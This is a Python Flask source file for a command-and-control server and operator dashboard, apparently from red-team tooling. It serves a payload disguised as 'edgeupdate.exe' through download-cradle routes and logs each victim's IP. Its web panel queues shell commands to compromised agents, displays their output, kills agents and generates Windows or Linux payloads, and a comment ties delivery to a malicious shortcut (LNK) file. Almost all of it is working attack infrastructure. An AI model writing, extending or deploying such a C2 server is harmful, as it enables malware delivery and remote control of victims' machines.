from flask import Flask, send_from_directory, request, render_template_string
import os

app = Flask(__name__)
PAYLOAD_DIR = "/home/kali/Documents/c2"

# Store download logs in memory for the UI
download_logs = []

@app.route('/get/agent')
def serve_agent():
    # Log the IP of the machine that triggered the cradle
    victim_ip = request.remote_addr
    print(f"[!] DOWNLOAD CRADLE TRIGGERED BY: {victim_ip} (edgeupdate.exe)")
    download_logs.insert(0, f"Victim IP: {victim_ip} (edgeupdate.exe)")
    if len(download_logs) > 50:
        download_logs.pop()
    
    return send_from_directory(
        directory=PAYLOAD_DIR,
        path="edgeupdate.exe",
        as_attachment=True,
        mimetype='application/octet-stream'
    )

@app.route('/get/payload/<filename>')
def serve_payload(filename):
    victim_ip = request.remote_addr
    print(f"[!] DOWNLOAD CRADLE TRIGGERED BY: {victim_ip} for {filename}")
    download_logs.insert(0, f"Victim IP: {victim_ip} ({filename})")
    if len(download_logs) > 50:
        download_logs.pop()
    
    return send_from_directory(
        directory=os.path.join(PAYLOAD_DIR, "payloads"),
        path=filename,
        as_attachment=True,
        mimetype='application/octet-stream'
    )

@app.route('/api/downloads')
def get_downloads():
    from flask import jsonify
    return jsonify(download_logs)

@app.route('/')
def index():
    html = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team Research</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; }
        .card { background-color: #1e1e1e; border: 1px solid #333; margin-bottom: 20px; }
        .card-header { background-color: #2a2a2a; border-bottom: 1px solid #333; font-weight: bold; color: #0f0; }
        .log-box { height: 200px; overflow-y: auto; background-color: #000; color: #0f0; padding: 10px; border: 1px solid #333; }
        .btn-primary { background-color: #007bff; border-color: #007bff; }
        .btn-primary:hover { background-color: #0056b3; border-color: #0056b3; }
        input[type="text"], select { background-color: #222 !important; color: #0f0 !important; border: 1px solid #444; }
        input[type="text"]:focus, select:focus { background-color: #222; color: #0f0; border: 1px solid #666; outline: none; box-shadow: none; }
        .text-success { color: #0f0 !important; }
        .agent-item { cursor: pointer; transition: background-color 0.2s; }
        .agent-item:hover { background-color: #333 !important; }
        .kill-btn { font-size: 0.8em; padding: 2px 6px; float: right; }
        .nav-tabs .nav-link { color: #e0e0e0; border-color: #333; }
        .nav-tabs .nav-link.active { background-color: #1e1e1e; color: #0f0; border-color: #333 #333 #1e1e1e; }
        .tab-content { border: 1px solid #333; border-top: none; padding: 20px; background-color: #1e1e1e; }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h2 class="mb-4 text-center" style="color: #0f0;">Red Team Research</h2>
        
        <ul class="nav nav-tabs" id="myTab" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="c2-tab" data-bs-toggle="tab" data-bs-target="#c2" type="button" role="tab" aria-controls="c2" aria-selected="true">C2 Dashboard</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="payload-tab" data-bs-toggle="tab" data-bs-target="#payload" type="button" role="tab" aria-controls="payload" aria-selected="false">Payload Creation</button>
            </li>
        </ul>
        
        <div class="tab-content" id="myTabContent">
            <div class="tab-pane fade show active" id="c2" role="tabpanel" aria-labelledby="c2-tab">
                <div class="row">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Payload Delivery Logs (/get/agent)</div>
                            <div class="card-body">
                                <div id="downloads" class="log-box" style="height: 150px;"></div>
                            </div>
                        </div>
                        
                        <div class="card">
                            <div class="card-header">Active Agents (Click to Select)</div>
                            <div class="card-body" style="padding: 0;">
                                <ul id="agents" class="list-group list-group-flush" style="background: transparent;">
                                </ul>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header">
                                Command & Control (Port 8080)
                                <span id="currentAgentDisplay" class="float-end text-warning">Target: ALL AGENTS</span>
                            </div>
                            <div class="card-body">
                                <div class="input-group mb-3">
                                    <input type="text" id="cmdInput" class="form-control" placeholder="Enter command to queue (e.g., whoami, dir, sleep)">
                                    <button class="btn btn-primary" id="sendBtn" type="button">Queue Task</button>
                                </div>
                                <small class="text-muted d-block mb-3" id="targetNote">Note: The command will be picked up by ALL agents on their next beacon.</small>
                                
                                <h5 style="color: #0f0;">Execution Results</h5>
                                <div id="results" class="log-box" style="height: 400px; white-space: pre-wrap;"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="tab-pane fade" id="payload" role="tabpanel" aria-labelledby="payload-tab">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header">Generate New Payload</div>
                            <div class="card-body">
                                <div class="mb-3">
                                    <label class="form-label text-success">Output Directory</label>
                                    <input type="text" class="form-control" value="/home/kali/Documents/c2/payloads" disabled>
                                </div>
                                <div class="mb-3">
                                    <label for="c2IpInput" class="form-label">C2 Server IP</label>
                                    <input type="text" class="form-control" id="c2IpInput" placeholder="e.g., 192.168.1.69" required>
                                </div>
                                <div class="mb-3">
                                    <label for="osSelect" class="form-label">Operating System (64-bit)</label>
                                    <select class="form-select" id="osSelect">
                                        <option value="windows">Windows</option>
                                        <option value="linux">Linux</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="payloadNameInput" class="form-label">Payload Name</label>
                                    <input type="text" class="form-control" id="payloadNameInput" placeholder="e.g., update.exe" required>
                                </div>
                                <button id="generateBtn" class="btn btn-primary w-100">Generate Payload</button>
                                
                                <div id="generateResult" class="mt-4" style="display: none;">
                                    <h5 style="color: #0f0;">Generation Output:</h5>
                                    <div id="generateLog" class="log-box" style="height: 100px;"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // We assume server is running on the same hostname but port 8080
        const C2_API = 'http://' + window.location.hostname + ':8080/api';
        let selectedAgentId = 'all';
        
        async function fetchDownloads() {
            try {
                const res = await fetch('/api/downloads');
                const logs = await res.json();
                document.getElementById('downloads').innerHTML = logs.join('<br>');
            } catch (e) { console.error(e); }
        }
        
        function selectAgent(id, ip) {
            selectedAgentId = id;
            if (id === 'all') {
                document.getElementById('currentAgentDisplay').innerText = 'Target: ALL AGENTS';
                document.getElementById('targetNote').innerText = 'Note: The command will be picked up by ALL alive agents on their next beacon.';
            } else {
                document.getElementById('currentAgentDisplay').innerText = 'Target: ' + ip + ' (' + id.substring(0,8) + '...)';
                document.getElementById('targetNote').innerText = 'Note: The command will be queued exclusively for this agent.';
            }
            fetchResults(); // Refresh results immediately for the selected agent
        }

        async function killAgent(event, id) {
            event.stopPropagation(); // Prevent agent selection
            if (confirm('Are you sure you want to send the kill command to this agent?')) {
                try {
                    await fetch(C2_API + '/command', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ command: 'kill', agent_id: id })
                    });
                    alert('Kill command queued for agent.');
                } catch (e) {
                    console.error(e);
                    alert('Error queuing kill command.');
                }
            }
        }

        async function clearAgent(event, id) {
            event.stopPropagation(); // Prevent agent selection
            if (confirm('Are you sure you want to clear this dead agent from the UI?')) {
                try {
                    await fetch(C2_API + '/clear_agent', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ agent_id: id })
                    });
                    if (selectedAgentId === id) {
                        selectAgent('all', 'ALL AGENTS');
                    }
                } catch (e) {
                    console.error(e);
                    alert('Error clearing agent.');
                }
            }
        }
        
        async function fetchAgents() {
            try {
                const res = await fetch(C2_API + '/agents');
                const agents = await res.json();
                const list = document.getElementById('agents');
                list.innerHTML = '';
                
                // Add an "All Agents" option
                const allStyle = (selectedAgentId === 'all') ? 'background-color: #333 !important;' : 'background: transparent;';
                list.innerHTML += `<li class="list-group-item text-warning agent-item" style="${allStyle}" onclick="selectAgent('all', 'ALL AGENTS')">🌐 ALL AGENTS</li>`;
                
                if (!agents || agents.length === 0) {
                    list.innerHTML += '<li class="list-group-item text-muted" style="background: transparent;">No agents connected</li>';
                } else {
                    agents.forEach(agent => {
                        const isSelected = (selectedAgentId === agent.id);
                        const style = isSelected ? 'background-color: #333 !important;' : 'background: transparent;';
                        const li = document.createElement('li');
                        li.className = 'list-group-item agent-item';
                        if (agent.status === 'dead') {
                            li.classList.add('text-danger');
                        } else {
                            li.classList.add('text-success');
                        }
                        li.style = style;
                        li.onclick = () => selectAgent(agent.id, agent.ip);
                        
                        // The agent text
                        const textSpan = document.createElement('span');
                        if (agent.status === 'dead') {
                            textSpan.innerText = `🔴 ${agent.ip} (${agent.id.substring(0,8)})`;
                        } else {
                            textSpan.innerText = `🟢 ${agent.ip} (${agent.id.substring(0,8)})`;
                        }
                        
                        // The Action Button
                        const actionBtn = document.createElement('button');
                        if (agent.status === 'dead') {
                            actionBtn.className = 'btn btn-outline-danger kill-btn border-0';
                            actionBtn.innerHTML = '❌';
                            actionBtn.title = 'Clear Agent';
                            actionBtn.onclick = (e) => clearAgent(e, agent.id);
                        } else {
                            actionBtn.className = 'btn btn-danger kill-btn';
                            actionBtn.innerText = 'Kill';
                            actionBtn.onclick = (e) => killAgent(e, agent.id);
                        }
                        
                        li.appendChild(textSpan);
                        li.appendChild(actionBtn);
                        list.appendChild(li);
                    });
                }
            } catch (e) { 
                console.error(e); 
                document.getElementById('agents').innerHTML = '<li class="list-group-item text-danger" style="background: transparent;">C2 Server Offline</li>';
            }
        }
        
        async function fetchResults() {
            try {
                let url = C2_API + '/results';
                if (selectedAgentId !== 'all') {
                    url += '?agent_id=' + encodeURIComponent(selectedAgentId);
                }
                const res = await fetch(url);
                const results = await res.json();
                document.getElementById('results').innerHTML = results.join('\n\n');
            } catch (e) { console.error(e); }
        }
        
        document.getElementById('sendBtn').addEventListener('click', async () => {
            const cmd = document.getElementById('cmdInput').value;
            if (!cmd) return;
            try {
                await fetch(C2_API + '/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd, agent_id: selectedAgentId })
                });
                document.getElementById('cmdInput').value = '';
            } catch (e) { 
                console.error(e);
                alert('Error queuing command. Make sure C2 server is running on port 8080.');
            }
        });
        
        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                document.getElementById('sendBtn').click();
            }
        });

        // Payload Generation Logic
        document.getElementById('generateBtn').addEventListener('click', async () => {
            const ip = document.getElementById('c2IpInput').value;
            const osType = document.getElementById('osSelect').value;
            const name = document.getElementById('payloadNameInput').value;
            const resDiv = document.getElementById('generateResult');
            const logBox = document.getElementById('generateLog');

            if (!ip || !name) {
                alert('Please provide an IP address and a payload name.');
                return;
            }

            resDiv.style.display = 'block';
            logBox.innerHTML = '<span class="text-warning">Generating... please wait.</span>';

            try {
                const res = await fetch(C2_API + '/generate_payload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ip, os: osType, name: name })
                });
                const data = await res.json();
                
                if (!res.ok) {
                    logBox.innerHTML = `<span class="text-danger">Error: ${data.error || 'Unknown error'}</span>`;
                } else {
                    const filename = data.path.split('/').pop();
                    const downloadUrl = `http://${window.location.hostname}/get/payload/${filename}`;
                    logBox.innerHTML = `<span class="text-success">Success!</span><br>Saved to: ${data.path}<br><br><strong>Download Cradle URL:</strong><br><span style="color: #0ff;">${downloadUrl}</span>`;
                }
            } catch (e) {
                console.error(e);
                logBox.innerHTML = `<span class="text-danger">Failed to connect to C2 API to generate payload.</span>`;
            }
        });

        // Polling for updates
        setInterval(() => {
            // Only fetch if C2 Dashboard is active (optional, but good practice)
            fetchDownloads();
            fetchAgents();
            fetchResults();
        }, 3000);
        
        // Initial fetch
        fetchDownloads();
        fetchAgents();
        fetchResults();
    </script>
</body>
</html>"""
    return render_template_string(html)

if __name__ == "__main__":
    # Running on port 80 to match our LNK target
    app.run(host='0.0.0.0', port=80)
